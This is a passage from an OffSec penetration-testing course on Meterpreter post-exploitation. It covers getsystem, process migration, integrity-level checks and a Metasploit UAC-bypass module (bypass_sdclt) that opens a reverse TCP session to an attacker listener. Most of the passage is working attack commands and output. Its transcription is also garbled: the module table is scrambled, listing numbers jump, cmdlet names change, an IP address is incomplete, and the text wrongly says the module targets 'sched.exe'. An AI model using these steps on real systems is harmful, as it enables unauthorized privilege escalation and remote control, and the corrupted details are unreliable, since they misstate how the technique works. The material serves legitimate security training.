
## 20.3.2 Post-Exploitation Modules

In addition to native commands and actions in the core functions of Meterpreter, there are several post-exploitation modules we can deploy against an active session.

Sessions that were created through attackers such as the execution of a client-side attack will likely provide us only with an underprivileged shell. But if the target user is member of the local administrators group, we can elevate our shell to a high integrity level if we can bypass User Account Control (UAC).

In the previous section, we migrated our Meterpreter to a OneDrive.exe process that is running (presumably) medium integrity. For this section, let's repeat the steps from the previous section and bypass UAC with a Metasploit post-exploitation module to obtain a session in the context of a high integrity level process.

As before, to bind the shell on port 4444 in ITWK01, download and execute met.exe, and enter getsystem to elevate our privileges. Then we use ps to identify the process ID of OneDrive.exe, and migrate to it.

```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > ps
```

Process List

| PID | PPID | Name | Arch | Session | User |
| --- | --- | --- | --- | --- | --- |
| 8044 | 3912 | OneDrive.exe | x64 | 1 | ITWK01\offsec |

| Path | C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe |

```
meterpreter > migrate 8044
[*] Migrating from 9020 to 8044...
[*] Migration completed successfully.
```

```
meterpreter > getuid
Server username: ITWK01\offsec
Listing 682 - Migrate to OneDrive process of the user offsec
```

Listing 682 shows that we are now running in the context of offsec again. While this is an administrative account, UAC prevents us from performing administrative operations unless we bypass UAC, as the current process has the integrity level Medium.

> 993 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-controls

## OffSec

To display the integrity level of a process, we can use tools such as Process Explorer^994 or third-party PowerShell modules such as NtObjectManager^995 Let's assume the latter is installed on the system.

Once we import the module with Import-Module^996 we can use Get-NtTokenIntegrityLevel^997 to display the integrity level of the current process by retrieving and reviewing the assigned access token:

```
meterpreter > shell
Process 6436 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22003.795]
(c) Microsoft Corporation. All rights reserved.
```

```
C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows

```
PS \Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager
```

```
PS \Windows\system32> Get-NtTokenIntegrityLevel
Get-NtTokenIntegrityLevel
Medium
```

Listing 683 shows that we are currently performing operations in the context of integrity level Medium.

Next, let's background the currently active channel and search to find and leverage UAC post-exploitation modules.

```
PS \Windows\system32> ^Z
Background channel 1? [y/N] y

meterpreter > bg
[*] Background session 9...
```

Listing 684 - Background channel and session

Now let's search for UAC bypass modules.

^994 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer

^995 (PowerShell Gallery, 2022), https://www.powershellgallery.com/packages/NtObjectManager/1/1.33

^996 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module/view-powershell-7-2

^997 (GitHub, 2021), https://github.com/googleprojector/sandbox-attacksurface-analysis-tools/blob/main/NtObjectManager/NtTokenIntegrityFunctions.ps1

PWK - © 2023 OffSec Services Limited. All rights reserved.

## msf6 exploit(multi/handler) > search UAC

Matching Modules

| Name | Disclosure Date | Rank | Check Description |
| --- | --- | --- | --- |
| 0 post/windows/manager/sticky_keys | | normal | | |
| No 1 exploit/windows/local/cve_2022_26904_superprofile | 2022-03-17 | excellent | Yes User Profile Arbitrary Junction Local Privilege Elevation |
| 2 exploit/windows/local/bypass_windows_Creation filesys | 2018-08-22 | manual | Windows 10 UAC Protection Bypass Windows Store (WSReset.exe) |
| Yes 3 exploit/windows/local/bypass_windows_store_reg | 2019-09-19 | manual | Windows 10 UAC Protection Bypass Windows Store (WSReset.exe) and Registry |
| 11 exploit/windows/local/bypass_sdclt | 2017-03-17 | | | |
| ... | ... | excellent Yes | Windows Escalate UAC Protection (Via Shell Open Registry Key) | |
| 12 exploit/windows/local/bypass_silentcleanup | 2019-02-24 | excellent No | Windows Escalate UAC Protection (Via SilentCleanup) | |

Listing 65 - Search for UAC bypass modules

The search yields quite few results. One very effective uac bypass on modern Windows systems is exploit/windows/local/bypass_sdclt, which targets the Microsoft binary sched.exe. This binary can be bypassed by UAC by spawning a process with high integrity level.98.

To use the module, we will activate it and set the SESSION and LHOST options for the module directly.

```
msf6 exploit(multi/handler) > use exploit/windows/local/bypass_sdclt
exploit/windows/local/bypass_sdclt

| Name | Setting | Description |
| --- | --- | --- |
| PAYLOAD_NAME | none | The payload to use for |
| LHOST | (default) | The listener address (interface) |
| LPORT | 4444 | The listener port |
| EXITFUNC | (default) | Exit function (handler) |
| SESSION | (default) | The session to run |

```
msf6 exploit(windows/local/bypass_sdclt) > set SESSION 9
msf6 exploit(windows/local/bypass_sdclt) > set LHOST 192.168.119.4
msf6 exploit(windows/local/bypass_sdclt) > run

+   reverse TCP handler on 192.168.119.4:4444
[*] UAC is Enabled, checking level...
[*] UAC is set to Default
[*] Bypass UAC by this setting, continuing...
[*] Please wait for session and cleanup
[*] C:\Users\OffSec\AppData\Temp\KjPRbrhd.exe
[*] Sending stage (20074 bytes) to 192.168.119.4:4444
[*] Meterpreter session 10 opened (192.168.119.4:4444 -> 192.168.50:24970) at 2022-08-04 09:03:54 -0400
[*] Registry Changes Removed
```

Listing 686 shows that your UAC post-exploitation module created a new Meterpreter session for us.

Let's check the integrity level of the process as we did before:

```
meterpreter > shell
Process 2328 created.
Channel 1 created.
Microsoft Windows [Version 10.0.2200.795]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows

PS C:\Windows\system32> Import-Module NtObjectManager
Import-Module NtObjectManager

PS C:\Windows\system32> Get-TokenIntegrityLevel
Get-TokenIntegrityLevel
High
```

> Listing 687 - Reviewing integrity level
